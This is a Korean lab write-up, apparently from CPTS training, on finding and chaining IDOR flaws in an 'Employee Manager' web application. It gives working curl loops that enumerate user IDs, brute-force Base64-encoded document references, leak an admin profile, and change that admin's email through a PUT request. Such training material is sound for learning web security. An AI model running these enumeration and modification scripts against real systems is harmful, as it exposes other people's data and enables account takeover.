---
title: "Web Attacks - IDOR"
date: 2026-07-30
layout: single
excerpt: "UID 열거, Base64로 인코딩된 참조값 분석, API 요청 조작을 통해 IDOR 취약점을 식별하고 연계하는 과정을 정리한다."
author_profile: true
toc: true
toc_label: "Web Attacks"
toc_icon: "book"
toc_sticky: true
categories: [cpts-web]
tags: [web, cpts, web-attacks, idor]
---

UID 열거, Base64로 인코딩된 참조값 분석, API 요청 조작을 통해 IDOR 취약점을 식별하고 연계하는 과정을 정리한다.

---

# Mass IDOR Enumeration

우선 다음과 같은 Employee Manager 웹 애플리케이션이 존재한다:

![Web Attacks](/assets/cpts-web/web-attacks-idor/web-attacks1.png)

이 중 `Documents` 메뉴에 들어가면 현재 사용자의 문서 목록이 출력된다:

![Web Attacks](/assets/cpts-web/web-attacks-idor/web-attacks2.png)

어떤 요청을 통해 문서 목록이 반환되는지 확인하기 위해 Burp Suite로 요청을 가로채 분석하였다:

![Web Attacks](/assets/cpts-web/web-attacks-idor/web-attacks3.png)

요청 본문에는 다음과 같이 `uid` 파라미터가 포함되어 있었으며, `POST` 방식으로 전송되고 있었다:

```http
POST /documents.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

uid=1
```

서버가 클라이언트에서 전달한 `uid` 값을 기준으로 문서 목록을 반환한다면, 다른 사용자의 UID를 입력하여 해당 사용자의 문서에 접근할 수 있을 가능성이 있다.

## Automating UID Enumeration

각 사용자의 문서에는 PDF뿐만 아니라 플래그가 저장된 TXT 파일이 존재할 수도 있다. 

따라서 `uid` 값을 순차적으로 변경하면서 `.txt` 문자열이 포함된 응답을 찾도록 간단한 Bash 스크립트를 작성하였다:

```bash
for i in {1..50}; do
    echo "uid=$i"
    curl -s -X POST -d "uid=$i" "http://154.57.164.81:31173/documents.php" | grep '\.txt'
done
```

스크립트를 실행한 결과, `uid=15` 사용자의 응답에서 TXT 파일이 발견되었다:

```html
uid=15
<li class='pure-tree_link'>
    <a href='/documents/Invoice_15_11_2020.pdf' target='_blank'>Invoice</a>
</li>
<li class='pure-tree_link'>
    <a href='/documents/Report_15_01_2020.pdf' target='_blank'>Report</a>
</li>
<li class='pure-tree_link'>
    <a href='/documents/flag_11dfa168ac8eb2958e38425728623c98.txt' target='_blank'>flag</a>
</li>
```

---

# Bypassing Encoded References

앞에서 확인한 것과 동일한 Employee Manager 웹 애플리케이션이다:

![Web Attacks](/assets/cpts-web/web-attacks-idor/web-attacks1.png)

이번에는 `Contracts` 메뉴에 들어가면 계약서 PDF 파일이 표시된다:

![Web Attacks](/assets/cpts-web/web-attacks-idor/web-attacks4.png)

계약서 링크를 클릭하면 해당 PDF 파일이 다운로드된다. 

다운로드 과정에서 어떤 요청이 발생하는지 확인하기 위해 Burp Suite로 요청을 가로채 분석하였다:

![Web Attacks](/assets/cpts-web/web-attacks-idor/web-attacks5.png)

요청은 다음과 같이 `download.php` 로 전송되며, `contract` 라는 GET 파라미터를 사용한다:

```http
GET /download.php?contract=MQ%3D%3D HTTP/1.1
```

URL 인코딩에서 `%3D` 는 `=` 문자를 의미하므로, 실제 `contract` 값은 다음과 같다:

```text
MQ==
```

해당 값을 Base64로 디코딩하면 숫자 `1` 이 출력된다:

```bash
$ echo "MQ==" | base64 -d

1
```

즉, 애플리케이션은 계약서 ID를 직접 노출하지 않고 Base64로 인코딩하여 전달하고 있었다.

그러나 Base64는 암호화 방식이 아니라 단순 인코딩 방식이므로, 값을 쉽게 디코딩하거나 새로운 값을 인코딩할 수 있다. 

따라서 숫자를 Base64로 인코딩한 뒤 `contract` 파라미터에 삽입하면 다른 계약서를 요청할 수 있다.

## Enumerating Encoded References

숫자 `1` 부터 `50` 까지 Base64로 인코딩하고, 각 값을 `contract` 파라미터에 넣어 계약서를 다운로드하도록 스크립트를 작성하였다:

```bash
$ for i in {1..50}; do
    echo "uid=$i"
    encode=$(echo -n "$i" | base64 -w 0)
    curl -sOJ "http://154.57.164.78:31930/download.php?contract=$encode"
done
```

다운로드가 끝난 뒤 크기가 0바이트보다 큰 파일을 확인하였다:

```bash
$ find . -maxdepth 1 -type f -size +0c -ls
```

그 결과, 크기가 30바이트인 계약서 파일이 발견되었다:

```text
-rw-rw-r-- 1 kali kali  30 Jul 30 10:42 contract_98f13708210194c475687be6106a3b84.pdf
```

해당 파일의 내용을 확인한 결과 최종 플래그가 포함되어 있었다.

---

# Chaining IDOR Vulnerabilities

동일한 Employee Manager 웹 애플리케이션에서 `Edit Profile` 메뉴로 이동하였다:

![Web Attacks](/assets/cpts-web/web-attacks-idor/web-attacks1.png)

프로필 페이지에는 현재 사용자의 이름, 이메일 주소 및 소개가 자동으로 표시된다:

![Web Attacks](/assets/cpts-web/web-attacks-idor/web-attacks6.png)

페이지를 열자마자 사용자 정보가 자동으로 입력되는 것으로 보아, 내부적으로 API 호출이 발생한다고 추측할 수 있다.

브라우저 개발자 도구의 Network 탭을 확인한 결과 `script.js` 파일이 로드되고 있었으며, 내부에는 다음 코드가 존재하였다.

```javascript
$(document).ready(function () {
    fetch('/profile/api.php/profile/1', {
        method: 'GET'
    }).then(function (response) {
        return response.json();
    }).then(function (json) {
        $("#full_name").val(json['full_name']);
        $("#email").val(json['email']);
        $("#about").val(json['about']);
        document.cookie = `role=${json['role']}`;
    });
});

function updateProfile(uid) {
    fetch("/profile/api.php/profile/1", {
        method: "PUT",
        headers: { 'Content-type': 'application/json', 'cookie': document.cookie },
        body: JSON.stringify({
            uid: uid,
            uuid: "40f5888b67c748df7efba008e7c2f9d2",
            role: "employee",
            full_name: $("#full_name").val(),
            email: $("#email").val(),
            about: $("#about").val(),
        }),
    }).then(function (res) {
        window.location.reload();
    });
}
```

페이지가 로드될 때 다음 경로로 `GET` 요청을 보내 사용자 정보를 조회하며, 프로필을 수정할 때는 동일한 API 경로에 `PUT` 요청을 보내 사용자 정보를 갱신한다.

API 경로에 직접 접근하면 다음 JSON 데이터가 반환된다.

```json
{ 
    "uid":"1",
    "uuid":"40f5888b67c748df7efba008e7c2f9d2",
    "role":"employee",
    "full_name":"Amy Lindon",
    "email":"a_lindon@employees.htb",
    "about":"A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

현재 사용자의 UID는 `1` 이며, URL 경로에도 동일한 값이 포함되어 있다:

```text
/profile/api.php/profile/1
```

서버가 요청자의 권한을 확인하지 않고 URL에 포함된 UID만을 기준으로 정보를 반환한다면, 경로의 숫자를 변경하여 다른 사용자의 정보를 조회할 수 있다.

## Leaking and Modifying an Admin Profile

관리자와 관련된 계정을 찾기 위해 UID를 순차적으로 변경하면서, 응답에 `admin` 또는 `administrator` 문자열이 포함되어 있는지 검사하는 스크립트를 작성하였다:

```bash
for i in {1..50}; do
    echo "uid=$i"                                                  
        if curl -s "http://154.57.164.77:30550/profile/api.php/profile/$i" | grep -Ei admin; then
        break                                           
    fi                               
done 
```

스크립트를 실행한 결과 `/profile/api.php/profile/10` 에서 관리자 계정이 발견되었다:

```json
{
    "uid":"10",
    "uuid":"bfd92386a1b48076792e68b596846499",
    "role":"staff_admin",
    "full_name":"admin",
    "email":"admin@employees.htb",
    "about":"Never gonna give you up, Never gonna let you down"
}
```

이 요청을 통해 다른 사용자의 UID뿐만 아니라 UUID, 역할, 이름, 이메일 주소 등의 정보까지 노출되었다.

다른 애플리케이션에서는 이와 유사한 정보 노출을 통해 내부 식별자, 개인정보 또는 추가 공격에 사용할 수 있는 민감한 데이터가 유출될 수 있다.

앞서 획득한 관리자 계정의 `uid`, `uuid`, `role` 값을 이용해 `/profile/api.php/profile/10` 으로 `PUT` 요청을 전송하고 이메일 주소를 변경하였다:

![Web Attacks](/assets/cpts-web/web-attacks-idor/web-attacks7.png)

응답 본문에서 `1` 이 반환된 것으로 보아 업데이트가 성공했을 가능성이 있다고 판단할 수 있다. 

다만 정확한 확인을 위해 다시 `GET` 요청을 전송하였다.

동일한 API 경로에 `GET` 요청을 전송한 결과 관리자 계정의 이메일 주소가 다음과 같이 변경되어 있었다:

![Web Attacks](/assets/cpts-web/web-attacks-idor/web-attacks8.png)